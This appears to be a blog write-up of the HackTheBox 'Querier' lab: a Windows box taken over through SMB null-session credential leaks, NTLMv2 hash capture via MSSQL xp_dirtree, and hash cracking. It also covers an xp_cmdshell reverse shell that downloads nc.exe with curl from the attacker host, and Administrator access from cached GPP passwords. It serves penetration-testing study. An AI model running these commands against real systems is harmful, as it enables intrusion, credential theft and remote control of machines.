---
layout: post
title:  HTB Querier Write-up
description: Part of the OSCP+ Preparation Series
date:   2024-11-08 20:00:00 +0300
image:  '/images/htb_querier.png'
tags:   [Write-ups, HTB, OSCP+, Windows, Medium, SMB, SMB-Shares, MSSQL, PowerUp.ps1, PsExec]
---

# Table of Contents
- [Enumeration](#enumeration)
  - [Nmap](#nmap)
  - [SMB Null Session to find MSSQL credentials](#smb-null-session-to-find-mssql-credentials)
  - [Connecting to MSSQL](#connecting-to-mssql)
- [Foothold](#foothold)
  - [Using SMB Share and a MSSQL Query to capture NTLMv2 Hash](#using-smb-share-and-a-mssql-query-to-capture-ntlmv2-hash)
  - [Cracking the NTLMv2 hash](#cracking-the-ntlmv2-hash)
  - [Using mssql-svc credentials and nc.exe to get a reverse shell](#using-mssql-svc-credentials-and-ncexe-to-get-a-reverse-shell)
- [Privilege Escalation](#privilege-escalation)
  - [Finding credentials using PowerUp.ps1](#finding-credentials-using-powerupps1)
  - [Access as Administrator using impacket-psexec](#access-as-administrator-using-impacket-psexec)

# Enumeration
### Nmap
```shell
# Step 1 - Find active ports
nmap -p- --min-rate 10000 10.129.148.17

# Step 2 - Focus scan on the active ports found (Note: In this case is important to use -T4 to make the scan succeed)
nmap -A -T4 -Pn -p135,139,445,1433,5985,47001 10.129.148.17
```

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-08 15:01 EST
Nmap scan report for 10.129.148.17
Host is up (0.039s latency).

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.148.17:1433: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: QUERIER
|     DNS_Domain_Name: HTB.LOCAL
|     DNS_Computer_Name: QUERIER.HTB.LOCAL
|     DNS_Tree_Name: HTB.LOCAL
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.129.148.17:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2024-11-08T20:02:01+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-11-08T19:49:45
|_Not valid after:  2054-11-08T19:49:45
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-11-08T20:01:55
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.69 seconds
```

Examining the Nmap results we found the following open ports:
- Port 135 RPC.
- Ports 139 and 445 related with SMB.
- Port 1433 MSSQL.
- Ports 5985 and 47001 related to WinRM.
### SMB Null Session to find MSSQL credentials
One of the first things I do when finding SMB service accessible, is to try a null session to get access without credentials.
We can try to list the available shares with the following command:
```shell
smbclient -N -L //10.129.142.78
```
We were successful. The command above gave us the following results:
```shell
Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Reports         Disk      
```
The Reports share looks quite suspicious. Let's examine it:
```shell
smbclient -N //10.129.142.102/Reports
```
Note: Restart the machine and try connecting to SMB again if we get any errors while connecting. If it doesnt get better, restart the VPN connection and Kali VM as well.
Inside the Reports share we found an excel file called Currency Volume Report, let's get it (Remember to use " " when a file name has spaces):
```shell
smb: \> ls
  .                                   D        0  Mon Jan 28 18:23:48 2019
  ..                                  D        0  Mon Jan 28 18:23:48 2019
  Currency Volume Report.xlsm         A    12229  Sun Jan 27 17:21:34 2019

                5158399 blocks of size 4096. 828765 blocks available
smb: \> get Currency Volume Report.xlsm
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \Currency
smb: \> get "Currency Volume Report.xlsm"
getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (59.1 KiloBytes/sec) (average 59.1 KiloBytes/sec)
```
The file seems to be empty. Let's analyze it with binwalk:

```shell
binwalk -e Currency\ Volume\ Report.xlsm 
```

After running binwalk and analyzing the extracted files, we found some credentials inside the following file:

```shell

cd '_Currency Volume Report.xlsm.extracted'
cd xl
cat vbaProject.bin

<SNIP>
p�      ������  �����   &��     �����   2@*� ��
�       ����▒�  ���� ����(�- macro to pull data for client volume reports��▒.0n.Conn]�8]�X�x�
 0(<Open 0B@rver=<��SELECT * FROM volume; 0%B.6word> 0!> @�� MsgBox "connection successful" 6�A1�$D%FB@H 6B@Bk��Xo��P����������,Set rs = conn.Execute("SELECT * @@version;")����X�kDriver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6 0(:����▒� further testing required����H������Attribute VB_Name = "ThisWorkbook"
<SNIP>
```
From it, we could see the following credentials and looking at the queries inside the file also guess that these are the credentials for MSSQL:

```shell

# Username
reporting
# Password
PcwTWTHRwryjc$c6
```

### Connecting to MSSQL
We can use the following command to connect to MSSQL using the credentials we found:

```shell
impacket-mssqlclient QUERIER/reporting:'PcwTWTHRwryjc$c6'@10.129.142.102 -windows-auth
```
If we try to get a reverse shell using enable_xp_cmdshell, we will get an error telling us that we dont have permission to run it:

```shell
SQL (QUERIER\reporting  reporting@volume)> enable_xp_cmdshell
ERROR: Line 1: You do not have permission to run the RECONFIGURE statement.
```
# Foothold
### Using SMB Share and a MSSQL Query to capture NTLMv2 Hash
Searching for possible attack vectors we came across this post:
https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478
To capture the hash, we will do the following steps.
First start impacket-smbserver on Kali:
```shell
impacket-smbserver -smb2support kalishare .
```

And then enter the following query on MSSQL with our Kali tun0 IP:

```shell
exec xp_dirtree '\\10.10.14.206\kalishare\',1,1
```
After that, we will get the following response on our SMB server:

```shell
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.129.187.241,49672)
[*] AUTHENTICATE_MESSAGE (QUERIER\mssql-svc,QUERIER)
[*] User QUERIER\mssql-svc authenticated successfully
[*] mssql-svc::QUERIER:aaaaaaaaaaaaaaaa:b364144c5e0225835caf59af3e3692c6:0101000000000000009c45262032db0189802e0a5f0076070000000001001000430063006f004900740075007100440003001000430063006f00490074007500710044000200100046006d004100680071005100560070000400100046006d0041006800710051005600700007000800009c45262032db0106000400020000000800300030000000000000000000000000300000a626f9ce02155427672795a5f8ab247ebd02a0f91f075471202dfd8b17c5a35e0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e00320030003600000000000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:kalishare)
[*] AUTHENTICATE_MESSAGE (\,QUERIER)
[*] User QUERIER\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
```

### Cracking the NTLMv2 hash
Now we can try to crack the hash:

```shell
# Copy and save the hash into text file, then save it as hash.txt
cat hash.txt

mssql-svc::QUERIER:aaaaaaaaaaaaaaaa:b364144c5e0225835caf59af3e3692c6:0101000000000000009c45262032db0189802e0a5f0076070000000001001000430063006f004900740075007100440003001000430063006f00490074007500710044000200100046006d004100680071005100560070000400100046006d0041006800710051005600700007000800009c45262032db0106000400020000000800300030000000000000000000000000300000a626f9ce02155427672795a5f8ab247ebd02a0f91f075471202dfd8b17c5a35e0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e00320030003600000000000000000000000000
```

```shell
# Crack the hash
john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Check the results
john --show --format=netntlmv2 hash.txt
```
We successfully cracked the hash and got the following credentials:

```shell
# Username
mssql-svc

# Password
corporate568
```

Alternatively, we can also crack the hash with hashcat:

```shell
hashcat -m 5600 -a 0 -o cracked.txt hash.txt /usr/share/wordlists/rockyou.txt hash.txt
```
### Using mssql-svc credentials and nc.exe to get a reverse shell
Now we can use the credentials of mssql-svc to access MSSQL:

```shell
impacket-mssqlclient QUERIER/mssql-svc:'corporate568'@10.129.187.241 -windows-auth
```
Enable xp_cmdshell entering the following 2 lines on the MSSQL shell, one at a time:

```shell
EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```
We can test if we can run commands now:

```shell
xp_cmdshell dir C:\
```
It works!

```shell
SQL (QUERIER\mssql-svc  dbo@master)> xp_cmdshell dir C:\
output                                                       
----------------------------------------------------------   
 Volume in drive C has no label.                             

 Volume Serial Number is 35CB-DA81                           

NULL                                                         

 Directory of C:\                                            

NULL                                                         

09/15/2018  07:19 AM    <DIR>          PerfLogs              

01/28/2019  11:55 PM    <DIR>          Program Files         

01/29/2019  12:02 AM    <DIR>          Program Files (x86)   

01/28/2019  11:23 PM    <DIR>          Reports               

01/28/2019  11:41 PM    <DIR>          Users                 

01/29/2019  06:15 PM    <DIR>          Windows               

               0 File(s)              0 bytes                

               6 Dir(s)   3,482,116,096 bytes free           

NULL
```

Now it's time to move nc.exe and get a reverse shell:

```shell
# Start python server on Kali where nc.exe is located
cp /usr/share/windows-resources/binaries/nc.exe nc.exe
python3 -m http.server 8080

# Start nc listener on Kali
nc -lvnp 8443

# Close MSSQL shell and connect again
impacket-mssqlclient QUERIER/mssql-svc:'corporate568'@10.129.148.136 -windows-auth

# Enter the 4 lines on MSSQL shell
EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXECUTE xp_cmdshell "curl http://10.10.14.206:8080/nc.exe -o C:\\Users\\Public\\nc.exe";
EXECUTE xp_cmdshell "C:\\Users\\Public\\nc.exe -nv 10.10.14.206 8443 -e powershell.exe";

# Enter the following command on the MSSQL shell
xp_cmdshell powershell -c nc.exe "10.10.14.206 8443 -e /bin/sh"
```
Note: If we are not getting a response on our Python server, reconnect again with impacket-mssqlclient and the commands again.
After running the commands above, we will get a response on our nc listener, giving us access as querier\mssql-svc:

```shell
listening on [any] 8443 ...
connect to [10.10.14.206] from (UNKNOWN) [10.129.142.173] 49673
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
querier\mssql-svc
```
Somehow the machine is super unstable. So we may need to restart the machine multiple times, try again, etc. Or just try waiting patiently for the commands run on the shell.
### User Flag
We can find the user.txt flag at the desktop of the user mssql-svc:

```shell
type C:\Users\mssql-svc\Desktop\user.txt
```
# Privilege Escalation
### Finding credentials using PowerUp.ps1
We will move the script PowerUp.ps1 into the target and use it to enumerate it. Let's first move the script into the target:

```shell
# On Kali
# Get PowerUp.ps1
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .

# Start python server
python3 -m http.server 8080

# In case we lost access - Get access again
nc -lvnp 8080

impacket-mssqlclient QUERIER/mssql-svc:'corporate568'@10.129.148.136 -windows-auth

EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXECUTE xp_cmdshell "curl http://10.10.14.206:8080/nc.exe -o C:\\Users\\Public\\nc.exe";
EXECUTE xp_cmdshell "C:\\Users\\Public\\nc.exe -nv 10.10.14.206 8443 -e powershell.exe";

# On target CLI
# Move PowerUp.ps1 into the target
cd C:\Windows\Temp
powershell -c iwr http://10.10.14.206:8080/PowerUp.ps1 -OutFile PowerUp.ps1 
```
Now we can run PowerUp.ps1 with the following command:

```shell
# Load the script
. .\PowerUp.ps1

# Run the script with Invoke-AllChecks
Invoke-AllChecks
```
The command above gave us many interesting results:
```shell
Privilege   : SeImpersonatePrivilege
Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
TokenHandle : 2560
ProcessId   : 528
Name        : 528
Check       : Process Token Privileges

ServiceName   : UsoSvc
Path          : C:\Windows\system32\svchost.exe -k netsvcs -p                                                       
StartName     : LocalSystem                                                                                         
AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'                                                                  
CanRestart    : True                                                                                                
Name          : UsoSvc                                                                                              
Check         : Modifiable Services                                                                                 
                                                                                                                    
ModifiablePath    : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps                                          
IdentityReference : QUERIER\mssql-svc                                                                               
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}                                           
%PATH%            : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps                                          
Name              : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

UnattendPath : C:\Windows\Panther\Unattend.xml
Name         : C:\Windows\Panther\Unattend.xml
Check        : Unattended Install Files

Changed   : {2019-01-28 23:12:48}
UserNames : {Administrator}
NewName   : [BLANK]
Passwords : {MyUnclesAreMarioAndLuigi!!1!}
File      : C:\ProgramData\Microsoft\Group 
            Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
Check     : Cached GPP Files
```
The results provided us some credentials for the username Administrator:

```shell
# Username
Administrator

# Password
MyUnclesAreMarioAndLuigi!!1!
```
### Access as Administrator using impacket-psexec
We will try to get access as Administrator with impacket-psexec using the credentials we found:

```shell
impacket-psexec Administrator:'MyUnclesAreMarioAndLuigi!!1!'@10.129.148.136
```
It worked! We successfully got access as Administrator:

```shell
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Requesting shares on 10.129.148.136.....
[*] Found writable share ADMIN$
[*] Uploading file YlkMVUEt.exe
[*] Opening SVCManager on 10.129.148.136.....
[*] Creating service tUHD on 10.129.148.136.....
[*] Starting service tUHD.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```
### Root Flag
Now we can get the root.txt flag:

```shell
type C:\Users\Administrator\Desktop\root.txt
```